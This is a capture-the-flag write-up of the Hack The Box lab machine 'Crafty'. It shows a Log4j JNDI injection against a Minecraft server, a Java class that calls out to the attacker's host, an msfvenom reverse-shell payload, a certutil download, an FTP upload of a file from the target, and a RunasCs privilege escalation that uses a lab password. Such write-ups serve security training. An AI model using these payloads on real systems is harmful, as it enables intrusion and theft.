---
title: "HTB Writeup: Crafty"
author: xpnt
date: 2024-06-14
image:
  path: https://pbs.twimg.com/media/GF1N_1zWkAAfibQ?format=jpg&name=medium
  height: 1500
  width: 500
categories: [Hack The Box, "Season 4: Savage Lands"]
tags: [labs,Log4j,Minecraft,connection strings,jd-gui]
---

# Writeup

- [Link: Pwned Date](https://www.hackthebox.com/achievement/machine/1504363/587)

## Description

- Crafty is an easy-difficulty Windows machine featuring the exploitation of a `Minecraft` server. Enumerating the version of the server reveals that it is vulnerable to pre-authentication Remote Code Execution (RCE), by abusing `Log4j Injection`. After obtaining a reverse shell on the target, enumerating the filesystem reveals that the administrator composed a Java-based `Minecraft` plugin, which when reverse engineered reveals `rcon` credentials. Those credentials are leveraged with the `RunAs` utility to gain Administrative access, compromising the system.

## Enumeration

- The pentester starts with a scan ports and discovered that `80,25535` are open.  Upon noticing the existence of the domain `crafty.htb`, he proceeds to add it to the `/etc/hosts` file.

```bash
# Nmap 7.94SVN scan initiated Thu Jun 13 16:08:37 2024 as: nmap -sCV -p80,25565 -n -v --min-rate 5000 -Pn -oN scanPorts 10.10.11.249
Nmap scan report for 10.10.11.249
Host is up (0.13s latency).

PORT      STATE SERVICE   VERSION
80/tcp    open  http      Microsoft IIS httpd 10.0
|_http-title: Did not follow redirect to http://crafty.htb
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: Microsoft-IIS/10.0
25565/tcp open  minecraft Minecraft 1.16.5 (Protocol: 127, Message: Crafty Server, Users: 1/100)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Jun 13 16:08:49 2024 -- 1 IP address (1 host up) scanned in 12.59 seconds
```

- Given the existence of a domain `crafty.htb`, the pentester performed fuzzing with `gobuster` in search of subdomains, but no luck.

```bash
gobuster vhost -u http://crafty.htb -w  /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt --append-domain  -t 100
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://crafty.htb
[+] Method:          GET
[+] Threads:         100
[+] Wordlist:        /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
[+] User Agent:      gobuster/3.6
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
Progress: 19966 / 19967 (99.99%)
===============================================================
Finished
===============================================================
```

> Comments: It's interesting to note that according to what `gobuster` reported, the subdomain `play.crafty.htb` doesn't exist, despite the `dashboard` seemingly indicating otherwise.
> 
>![](/assets/images/HTB-Writeup-Crafty/Pasted image 20240613154533.png)
>
> Nevertheless, the pentester attempted to add the said vhost `play.crafty.htb` to try to access it; however, he didn't achieve anything fruitful, as he only received a redirect to `crafty.htb`.
> 
>![](/assets/images/HTB-Writeup-Crafty/Pasted image 20240613154937.png)
 {: .prompt-info }

- Since there's nothing interesting on port `80`, the pentester looked for vulnerabilities in the `Minecraft 1.16.5` version. This way, he discovered it's possible to exploit `Log4j` in this vulnerable version of `Minecraft`.

![](/assets/images/HTB-Writeup-Crafty/Pasted image 20240613164411.png)


## Foothold


- [Justin-Garey](https://github.com/Justin-Garey/Minecraft-Log4j-Exploit) has a detailed explanation of how to exploit this vulnerability, so I invite you to take a look. Essentially, it involves once you're inside the Minecraft server, sending a chat message that will use the JNDI (Java Naming and Directory Interface) functionality to connect to our LDAP server. Once it attempts to connect to the LDAP server, it will use LDAP referral to send the request to the web server. Finally, when it connects to the web server, it will receive the Log4jRCE.class file, which will achieve the RCE. As they say, a picture is worth a thousand words, so I attach an [excellent graphic of Justin-Garey's attack vector.](https://github.com/Justin-Garey/Minecraft-Log4j-Exploit/blob/main/MinecraftExploitMap.png)

![](/assets/images/HTB-Writeup-Crafty/MinecraftExploitMap.png)


- Before, important configurations.

![](/assets/images/HTB-Writeup-Crafty/Pasted image 20240613190326.png)

![](/assets/images/HTB-Writeup-Crafty/Pasted image 20240613190448.png)

- Next, to exploit this vulnerability, the pentester first set up the `LDAP` server, as well as the `web` server.

![](/assets/images/HTB-Writeup-Crafty/Pasted image 20240613190911.png)

- He created the `Log4jRCE.class` with the following `Log4jRCE.java` file.

```java
public class Log4jRCE {
    static {
        try {
           String RevS = "curl http://10.10.14.151/testLog4j";         
           Runtime.getRuntime().exec(RevS).waitFor();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

- With the command `javac`, he created `Log4jRCE.class`, which will execute a `curl` command to the pentester's server on port 80, to confirm the vulnerability.

```bash
javac Log4jRCE.java
# Log4jRCE.class
```

- The pentester set up the `Minecraft` server in order to later connect to it.

![](/assets/images/HTB-Writeup-Crafty/Pasted image 20240613194427.png)

![](/assets/images/HTB-Writeup-Crafty/Pasted image 20240613200425.png)

- Then he sent the following chat message in order to exploit the `Log4j` vulnerability

```
${jndi:ldap://10.10.14.151:1389/Log4jRCE}
```

- Great! The pentester confirmed that the `curl` command was executed.

![](/assets/images/HTB-Writeup-Crafty/Pasted image 20240613195448.png)


## User

- Then he created a `Log4jRCE.java` file that would allow him to establish a reverse shell.

![](/assets/images/HTB-Writeup-Crafty/Pasted image 20240613200534.png)

![](/assets/images/HTB-Writeup-Crafty/Pasted image 20240613232048.png)

- After generating the `Log4jRCE.class`, he sent the same chat message in `Minecraft` and received a reverse shell

```
${jndi:ldap://10.10.14.151:1389/Log4jRCE}
```

![](/assets/images/HTB-Writeup-Crafty/Pasted image 20240613200738.png)

- Reading `user.txt`

![](/assets/images/HTB-Writeup-Crafty/Pasted image 20240613202725.png)

## Root
- After an extensive enumeration, the pentester found the plugin `playercounter-1.0-SNAPSHOT.jar`. This plugin likely serves to obtain the player count from another server to prevent a player from joining the server if there are too many players ([Source](https://www.spigotmc.org/threads/bungeecord-messaging-how-to-easily-get-the-player-count-of-another-server.570486/)). So, it's possible to obtain connection strings within it!

![](/assets/images/HTB-Writeup-Crafty/Pasted image 20240613235007.png)

- With the following commands, the pentester set up a `writable FTP` server to transfer the `playercounter-1.0-SNAPSHOT.jar` file from the target host to their attack host for further analysis.

```bash
# Attack host
python3 -m pyftpdlib --port 21 --write
```

![](/assets/images/HTB-Writeup-Crafty/Pasted image 20240613205119.png)

```powershell
# Target host
(New-Object Net.WebClient).UploadFile('ftp://10.10.14.151/playercounter-1.0-SNAPSHOT.jar', 'c:\users\svc_minecraft\server\plugins\playercounter-1.0-SNAPSHOT.jar')
```

![](/assets/images/HTB-Writeup-Crafty/Pasted image 20240613205540.png)

- The `successful transfer` is verified using the MD5 hash of the files.

```bash
# Attack host
md5sum playercounter-1.0-SNAPSHOT.jar
```

![](/assets/images/HTB-Writeup-Crafty/Pasted image 20240613205708.png)

```powershell
# Target host
get-filehash -path c:\users\svc_minecraft\server\plugins\playercounter-1.0-SNAPSHOT.jar -algorithm md5
```

![](/assets/images/HTB-Writeup-Crafty/Pasted image 20240613203626.png)


- The pentester used `jd-gui` to open the JAR file, searching for passwords or connection strings (which is common in HTB's machines). Great! He found a possible credential in `Playercounter.class` for the user `administrator`. If you're wondering why he thoughts that? Well, the real question here is, 'why not?'

![](/assets/images/HTB-Writeup-Crafty/Pasted image 20240613210312.png)

- So, he created a payload with `msfvenom` to obtain a reverse shell as `Administrator`, assuming `s67u84zKq8IXw` is indeed the password.

```bash
msfvenom -p windows/x64/meterpreter/reverse_https lhost=10.10.14.151 lport=4445 -f exe -o revshmet.exe
```

![](/assets/images/HTB-Writeup-Crafty/Pasted image 20240613211049.png)

```powershell
certutil -f -urlcache http://10.10.14.151/revshmet.exe revshmet.exe
```

![](/assets/images/HTB-Writeup-Crafty/Pasted image 20240613211246.png)

- Finally, the pentester executed `RunasCs.exe` to receive a reverse shell in `meterpreter` and then read `root.txt`.

```powershell
C:\users\svc_minecraft\RunasCs.exe Administrator s67u84zKq8IXw "cmd /c start C:\users\public\revshell\revshmet.exe"
```

![](/assets/images/HTB-Writeup-Crafty/Pasted image 20240613225747.png)

![](/assets/images/HTB-Writeup-Crafty/Pasted image 20240613230648.png)

>Comments: It's interesting to know that `meterpreter` is a shell approximation that uses `Shellwords`, which is why it's necessary to use double quotes or single quotes to execute commands. [Source](https://github.com/rapid7/metasploit-framework/issues/10701)
 {: .prompt-info }

>I hope you had as much fun reading this write up as I did writing it. If this writeup helped you, please feel free to go to my [`Hack The Box profile (xpnt)`](https://app.hackthebox.com/users/1504363) and give me a respect 😁. Happy Hacking!!👾
{: .prompt-tip }